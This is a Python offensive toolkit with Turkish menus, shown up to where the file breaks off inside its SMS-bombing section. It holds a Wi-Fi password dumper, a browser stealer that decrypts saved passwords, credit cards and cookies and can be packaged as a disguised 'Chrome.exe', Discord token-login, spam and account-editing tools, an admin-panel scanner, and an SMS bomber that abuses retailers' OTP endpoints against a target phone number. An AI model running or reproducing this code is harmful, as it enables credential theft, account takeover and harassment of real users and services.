from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
import time
import requests
import asyncio
import aiohttp
import os
import subprocess
import sys
from bs4 import BeautifulSoup
import openpyxl
import random
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time as t
import socket
import itertools
from cryptography.fernet import Fernet
import requests, re , colorama ,random
from colorama import Fore, Back, Style
from requests.structures import CaseInsensitiveDict
renkler = [Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX, Fore.WHITE,Fore.YELLOW] 
random_renk = random.choice(renkler)

print(random_renk,"")
user = str(input("User Name : "))

def wifiAğları():
    
    while True:

        import subprocess

        print("Sistem analiz ediliyor")
        import time

        time.sleep(1)

        print("Bulunan Wifiler: ")

        veri = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        sistemler = [i.split(":")[1][1:-1] for i in veri if "All User Profile" in i]
        for i in sistemler:
            sonuç = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
                '\n')
            sonuç = [b.split(":")[1][1:-1] for b in sonuç if "Key Content" in b]
            try:
                print(" \\{:<30}| Şifre:  {:<}".format(i, sonuç[0]))
            except IndexError:
                print(" \\{:<30}| Şifre:  {:<}".format(i, ""))

        exe = int(input("\n \n \n1'e basarak yeniden sistemi analiz edebilirsiniz \n2'ye basarak çıkış yapabilirsiniz "))
        if (exe == 1):
            print("")
            import time

            time.sleep(1)


        elif (exe == 2):
            print("")
            import time

            time.sleep(1)
            break
            quit()

        else:
            print("Bir hata yaptınız lütfen tekrar deneyin")

def chrome():
    def kayıt():
        kod = '''
        
        import base64
        import json
        import os
        import shutil
        import sqlite3
        from datetime import datetime, timedelta

        from Crypto.Cipher import AES
        from win32crypt import CryptUnprotectData

        appdata = os.getenv('LOCALAPPDATA')

        browsers = {
            'avast': appdata + '\\AVAST Software\\Browser\\User Data',
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }

        data_queries = {
            'login_data': {
                'query': 'SELECT action_url, username_value, password_value FROM logins',
                'file': '\\Login Data',
                'columns': ['URL', 'Email', 'Password'],
                'decrypt': True
            },
            'credit_cards': {
                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
                'file': '\\Web Data',
                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
                'decrypt': True
            },
            'cookies': {
                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
                'file': '\\Network\\Cookies',
                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
                'decrypt': True
            },
            'history': {
                'query': 'SELECT url, title, last_visit_time FROM urls',
                'file': '\\History',
                'columns': ['URL', 'Title', 'Visited Time'],
                'decrypt': False
            },
            'downloads': {
                'query': 'SELECT tab_url, target_path FROM downloads',
                'file': '\\History',
                'columns': ['Download URL', 'Local Path'],
                'decrypt': False
            }
        }


        def get_master_key(path: str):
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                return

            with open(path + "\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            key = CryptUnprotectData(key, None, None, None, 0)[1]
            return key


        def decrypt_password(buff: bytes, key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass


        def save_results(browser_name, type_of_data, content):
            if content is not None:
                file_path = f'{browser_name}_{type_of_data}.txt'
                with open(file_path, 'w', encoding="utf-8") as file:
                    file.write(content)
                print(f"\t [*] Saved {type_of_data} for {browser_name} in {file_path}")
            else:
                print(f"\t [-] No Data Found for {type_of_data} in {browser_name}")




        def get_data(path: str, profile: str, key, type_of_data):
            db_file = f'{path}\\{profile}{type_of_data["file"]}'
            if not os.path.exists(db_file):
                return
            result = ""
            shutil.copy(db_file, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = decrypt_password(row[i], key)
                if data_type_name == 'history':
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = "0"
                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            conn.close()
            os.remove('temp_db')
            return result


        def convert_chrome_time(chrome_time):
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


        def installed_browsers():
            available = []
            for x in browsers.keys():
                if os.path.exists(browsers[x]):
                    available.append(x)
            return available


        if __name__ == '__main__':
            
            

            available_browsers = installed_browsers()

            for browser in available_browsers:
                browser_path = browsers[browser]
                master_key = get_master_key(browser_path)
                print(f"Getting Stored Details from {browser}")

                for data_type_name, data_type in data_queries.items():
                    print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
                    data = get_data(browser_path, "Default", master_key, data_type)
                    save_results(browser, data_type_name, data)
                    print("\t------\n")
'''
        print("[1] .py olarak kayot et\n[2] .exe olarak kayıt et")
        c = int(input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları/TarayıcıBilgileriAlma/DosyaKayıtEtme$ "))
        if c == 1:
            ths = open("Chrome.py", "w")
            ths.write(kod)
            print("Dosya 'Chrome.py' olarak kayıt edildi")
        if c == 2:
            ths = open("Chrome.py", "w")
            ths.write(kod)
            subprocess.run(["pyinstaller", "--onefile", "Chrome.py"], check=True)
            print("'Chrome.exe' olarak kayıt edildi")

    print("[1] Kayıt et\n[2] Kayıt etmeden devam et")
    choice = int(input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları/TarayıcıBilgileriAlma$ "))
    if choice == 1:
        kayıt()
    elif choice == 2:
        import base64
        import json
        import os
        import shutil
        import sqlite3
        from datetime import datetime, timedelta

        from Crypto.Cipher import AES
        from win32crypt import CryptUnprotectData

        appdata = os.getenv('LOCALAPPDATA')

        browsers = {
            'avast': appdata + '\\AVAST Software\\Browser\\User Data',
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }

        data_queries = {
            'login_data': {
                'query': 'SELECT action_url, username_value, password_value FROM logins',
                'file': '\\Login Data',
                'columns': ['URL', 'Email', 'Password'],
                'decrypt': True
            },
            'credit_cards': {
                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
                'file': '\\Web Data',
                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
                'decrypt': True
            },
            'cookies': {
                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
                'file': '\\Network\\Cookies',
                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
                'decrypt': True
            },
            'history': {
                'query': 'SELECT url, title, last_visit_time FROM urls',
                'file': '\\History',
                'columns': ['URL', 'Title', 'Visited Time'],
                'decrypt': False
            },
            'downloads': {
                'query': 'SELECT tab_url, target_path FROM downloads',
                'file': '\\History',
                'columns': ['Download URL', 'Local Path'],
                'decrypt': False
            }
        }


        def get_master_key(path: str):
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                return

            with open(path + "\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            key = CryptUnprotectData(key, None, None, None, 0)[1]
            return key


        def decrypt_password(buff: bytes, key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass


        def save_results(browser_name, type_of_data, content):
            if content is not None:
                file_path = f'{browser_name}_{type_of_data}.txt'
                with open(file_path, 'w', encoding="utf-8") as file:
                    file.write(content)
                print(f"\t [*] Saved {type_of_data} for {browser_name} in {file_path}")
            else:
                print(f"\t [-] No Data Found for {type_of_data} in {browser_name}")




        def get_data(path: str, profile: str, key, type_of_data):
            db_file = f'{path}\\{profile}{type_of_data["file"]}'
            if not os.path.exists(db_file):
                return
            result = ""
            shutil.copy(db_file, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = decrypt_password(row[i], key)
                if data_type_name == 'history':
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = "0"
                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            conn.close()
            os.remove('temp_db')
            return result


        def convert_chrome_time(chrome_time):
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


        def installed_browsers():
            available = []
            for x in browsers.keys():
                if os.path.exists(browsers[x]):
                    available.append(x)
            return available


        if __name__ == '__main__':
            
            

            available_browsers = installed_browsers()

            for browser in available_browsers:
                browser_path = browsers[browser]
                master_key = get_master_key(browser_path)
                print(f"Getting Stored Details from {browser}")

                for data_type_name, data_type in data_queries.items():
                    print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
                    data = get_data(browser_path, "Default", master_key, data_type)
                    save_results(browser, data_type_name, data)
                    print("\t------\n")

def discord():
    def passwo():
        def get_token(username, password):
            login_url = "https://discord.com/api/v9/auth/login"
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            }
            login_payload = {
                "login": username,
                "password": password,
                "undelete": False,
                "captcha_key": None,
                "login_source": None,
                "gift_code_sku_id": None,
            }


            response = requests.post(login_url, json=login_payload, headers=headers)

            if response.status_code == 200:
                token = response.json().get('token')
                print(f"Alınan token: {token}")
                return token
            else:
                print(f"Login failed: {response.status_code} - {response.text}")
                return None

        def login_and_join(token):
            
            headers = {
                "Authorization": token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            }
            

            user_info_url = "https://discord.com/api/v9/users/@me"
            response = requests.get(user_info_url, headers=headers)
            
            if response.status_code == 200:
                print("User info retrieved successfully")
                print(response.json())
            else:
                print(f"Failed to retrieve user info: {response.status_code} - {response.text}")

        username = input("Discord'a kayıtlı mail adresi: ")
        password = input("Discord şifresi: ")

        token = get_token(username, password)

        if token:
            login_and_join(token)

    def degistir():
        m = str(input("Yeni ismi girin : "))
        ff = input("Yeni pp dosya yolu giriniz : ")
        tok = input("Tokeni giriniz : ")
        import discord

        client = discord.Client(intents=discord.Intents.all())

        @client.event
        async def on_ready():
            # Get the bot's user object.
            bot = client.user
            
            # Set the bot's name and description.
            new_name = m
            
            # Change the bot's name and description.
            await bot.edit(username=new_name)
            

            # Change the bot's profile picture (avatar).
            with open(ff, "rb") as avatar_file:
                await bot.edit(avatar=avatar_file.read())

        # Run the bot with your token
        client.run(tok)

    def sel():
        def login_and_join(token, gecko_driver_path):

            firefox_options = Options()
            firefox_options.set_preference("dom.webdriver.enabled", False)
            firefox_options.set_preference('useAutomationExtension', False)
            firefox_options.headless = False  
            driver = webdriver.Firefox(service=Service(gecko_driver_path), options=firefox_options)


            driver.get("https://discord.com/login")

            script = """
            function login(token) {
                setInterval(() => {
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                }, 50);
                setTimeout(() => {
                    location.reload();
                }, 2500);
            }
            """
            driver.execute_script(script + f'login("{token}")')

            time.sleep(5)

        gecko_driver_path = input("GeckoDriver dosya yolu: ")
        token = input("Discord tokeni: ")
        login_and_join(token, gecko_driver_path)

    async def send_message(session, url, headers, message_data):
        async with session.post(url, headers=headers, json=message_data) as response:
            if response.status == 200:
                print('Message sent successfully.')
            else:
                print('An error occurred. Message could not be sent.')

    async def bump_channel(token, channel_id):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }


        message_content = input("Spam içeriği: ")
        tts_option = input("TTS aktif edilsinmi (True/False): ")
        num_times_to_send = int(input("Kaç saniyede 1 mesajı göndersin: "))

        message_data = {
            'content': message_content,
            'tts': bool(tts_option)
        }

        urls = [f'https://discord.com/api/v9/channels/{channel_id}/messages'] * num_times_to_send

        async with aiohttp.ClientSession() as session:
            tasks = []
            
            for url in urls:
                task = asyncio.ensure_future(send_message(session=session, url=url,
                                                        headers=headers,
                                                        message_data=message_data))
                tasks.append(task)

            await asyncio.gather(*tasks)

    def spam():
        t = input("Tokeni giriniz: ")
        cid = input("Spam atılacak kanalın ID: ")
        token = t
        channel_id = cid

        loop = asyncio.get_event_loop()
        loop.run_until_complete(bump_channel(token=token, channel_id=channel_id))
    
    def j4j():
        yazı = '''
            __          __ __              __
            / /         / // /             / /
        __  / /         / // /_        __  / / 
        / /_/ /         /__  __/       / /_/ /  
        \____/            /_/          \____/   



        '''

        print(yazı)

        async def read_message_content():
            try:
                with open('mesaj.txt', 'r', encoding='utf-8') as file:
                    return file.read()
            except FileNotFoundError:
                print("Error: 'mesaj.txt' not found.")
                return None

        async def send_message(session, url, headers, message_data):
            async with session.post(url, headers=headers, json=message_data) as response:
                if response.status == 200:
                    print('Mesaj başarıyla gönderildi.')
                else:
                    print('Mesaj gönderilirken bir hata oluştu.')

        async def bump_channel(token, channel_id, delay_seconds):
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

            # Read message content from 'mesaj.txt'
            message_content = await read_message_content()

            if message_content is None:
                return

            tts_option = input("TTS Etkinleştirilsin mi? (True/False) : ")
            num_times_to_send = int(input("Kaç kez gönderileceğini girin : "))

            message_data = {
                'content': message_content,
                'tts': bool(tts_option)
            }

            urls = [f'https://discord.com/api/v9/channels/{channel_id}/messages'] * num_times_to_send

            async with aiohttp.ClientSession() as session:
                tasks = []

                for url in urls:
                    task = asyncio.ensure_future(send_message(session=session, url=url,
                                                            headers=headers,
                                                            message_data=message_data))
                    tasks.append(task)
                    await asyncio.sleep(delay_seconds)  # Introduce the delay between messages

                await asyncio.gather(*tasks)

        x = input("Token : ")
        c = input("Mesaj gönderilecek kanal id : ")
        # Usage example with a delay of 5 seconds between messages
        token = x
        channel_id = c
        delay_seconds = int(input("Mesaj kaç saniyede bir gönderilsin : "))

        loop = asyncio.get_event_loop()
        loop.run_until_complete(bump_channel(token=token, channel_id=channel_id, delay_seconds=delay_seconds))

    print('''
    1 - token ile giriş
    2 - Şifre ile ayrıntılı bilgi alma
    3 - Spam 
    4 - Bilgileri değiştirme
    5 - J4J Botu
    98 - Üst Menü
    99 - Çıkış    
        ''')


    i = int(input(f"HeJo@{user}:~/SosyalMedyaTooları/Discord$ "))
    if i == 1:
        sel()
    elif i == 2:
        passwo()
    elif i == 3:
        spam()
    elif i ==4:
        degistir()
    elif i ==5:
        j4j()
    elif i == 98:
        sosyalMedyaToolları()
    elif i == 99:
        exit()
    else:
        print("Yanlış giriş")

def adminPanelScan():

    lst = ('cpanel/','admin/','administrator/','login.php','administration/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','/login.aspx',
        'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
        'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
        'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
        'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
        'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
        'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','administration','pages/admin/admin-login.html','admin/admin-login.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
        'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
        'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
        'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
        'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
        'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
        'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
        'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
        'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
        'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
        'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
        'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
        'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',)


    url = input("URL (Örnek : https://www.youtube.com) : ")
    print(f"HeJo@{user}:~/WebTooları$\nTarama başlıyor...")
    cnt =0
    for v in lst:
        try:
            req = requests.get(url+"/"+v)
            if req.status_code not in [404,403,401,402]:
                print(f" Bulunan : {url+'/'+v}")
                cnt+=1
        except:
            pass

    print(f"Tarama tamamlandı. {cnt} sonuçlar bulundu.")
def spotify():
    def download_spotify_song(spotify_url, output_dir):
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        try:
            subprocess.run(['spotdl', spotify_url, '--output', output_dir], check=True)
            print('İndirme tamamlandı!')
        except subprocess.CalledProcessError as e:
            print(f'İndirme başarısız: {e}')


    output_dir = "downloads"
    spotify_url = input('Spotify şarkı URL\'sini girin: ')
    
    if spotify_url:
        print('İndirme başlatılıyor...')
        download_spotify_song(spotify_url, output_dir)


def sms():
    os.system("pkg install figlet")
    os.system("clear")
    os.system("sms")
    try:
        import requests, urllib3, uuid
    except ImportError:
        print("Gerekli modüller indiriliyor...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
    finally:
        import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid

    def a101(number):
        try:
            url = "https://www.a101.com.tr/users/otp-login/"
            payload = {
                "phone" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "A101"
            else:
                return False, "A101"
        except:
            return False, "A101"

    def bim(number):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            payload = {
                "phone" : f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "BIM"
            else:
                return False, "BIM"
        except:
            return False, "BIM"

    def defacto(number):
        try:
            url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
            payload = {
                "mobilePhone" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["Data"]
            if r1 == "IsSMSSend":
                return True, "Defacto"
            else:
                return False, "Defacto"
        except:
            return False, "Defacto"

    def istegelsin(number):
        try:
            url = "https://prod.fasapi.net/"
            payload = {
                "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
                "variables" : {
                    "phoneNumber" : f"90{number}"
                }
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "İsteGelsin"
            else:
                return False, "İsteGelsin"
        except:
            return False, "İsteGelsin"

    def ikinciyeni(number):
        try:
            url = "https://apigw.ikinciyeni.com/RegisterRequest"
            payload = {
                "accountType": 1,
                "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
                "isAddPermission": False,
                "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                "phone": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSucceed"]

            if r1 == True:
                return True, "İkinci Yeni"
            else:
                return False, "İkinci Yeni"
        except:
            return False, "İkinci Yeni"

    def migros(number):
        try:
            url = "https://www.migros.com.tr/rest/users/login/otp"
            payload = {
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["successful"]

            if r1 == True:
                return True, "Migros"
            else:
                return False, "Migros"
        except:
            return False, "Migros"

    def ceptesok(number):
        try:
            url = "https://api.ceptesok.com/api/users/sendsms"
            payload = {
                "mobile_number": f"{number}",
                "token_type": "register_token"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 200:
                return True, "Cepte Şok"
            else:
                return False, "Cepte Şok"
        except:
            return False, "Cepte Şok"

    def tiklagelsin(number):
        try:
            url = "https://www.tiklagelsin.com/user/graphql"
            payload = {
                "operationName": "GENERATE_OTP",
                "variables": {
                    "phone": f"+90{number}",
                    "challenge": f"{uuid.uuid4()}",
                    "deviceUniqueId": f"web_{uuid.uuid4()}"
                },
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Tıkla Gelsin"
            else:
                return False, "Tıkla Gelsin"
        except:
            return False, "Tıkla Gelsin"

    def bisu(number):
        try:
            url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
            payload = {
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "BiSU"
            else:
                return False, "BiSU"
        except:
            return False, "BiSU"

    def file(number):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            payload = {
                "mobilePhoneNumber": f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["data"]
            if r1 == "200 OK":
                return True, "File"
            else:
                return False, "File"
        except:
            return False, "File"

    def ipragraz(number):
        try:
            url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            payload = {
                "otp": "",
                "phoneNumber": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "İpragaz"
            else:
                return False, "İpragaz"
        except:
            return False, "İpragaz"

    def pisir(number):
        try:
            url = "https://api.pisir.com/v1/login/"
            payload = {"msisdn": f"90{number}"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["ok"]
            if r1 == "1":
                return True, "Pişir"
            else:
                return False, "Pişir"
        except:
            return False, "Pişir"

    def coffy(number):
        try:
            url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
            payload = {"phoneNumber": f"+90{number}"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Coffy"
            else:
                return False, "Coffy"
        except:
            return False, "Coffy"

    def sushico(number):
        try:
            url = "https://api.sushico.com.tr/tr/sendActivation"
            payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["err"]
            if r1 == 0:
                return True, "SushiCo"
            else:
                return False, "SushiCo"
        except:
            return False, "SushiCo"

    def kalmasin(number):
        try:
            url = "https://api.kalmasin.com.tr/user/login"
            payload = {
                "dil": "tr",
                "device_id": "",
                "notification_mobile": "android-notificationid-will-be-added",
                "platform": "android",
                "version": "2.0.6",
                "login_type": 1,
                "telefon": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Kalmasın"
            else:
                return False, "Kalmasın"
        except:
            return False, "Kalmasın"

    def yotto(number):
        try:
            url = "https://42577.smartomato.ru/account/session.json"
            payload = {
                "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 201:
                return True, "Yotto"
            else:
                return False, "Yotto"
        except:
            return False, "Yotto"

    def qumpara(number):
        try:
            url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
            payload = {
                "msisdn" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Qumpara"
            else:
                return False, "Qumpara"
        except:
            return False, "Qumpara"

    def aygaz(number):
        try:
            url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
            payload = {
                "Gsm" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
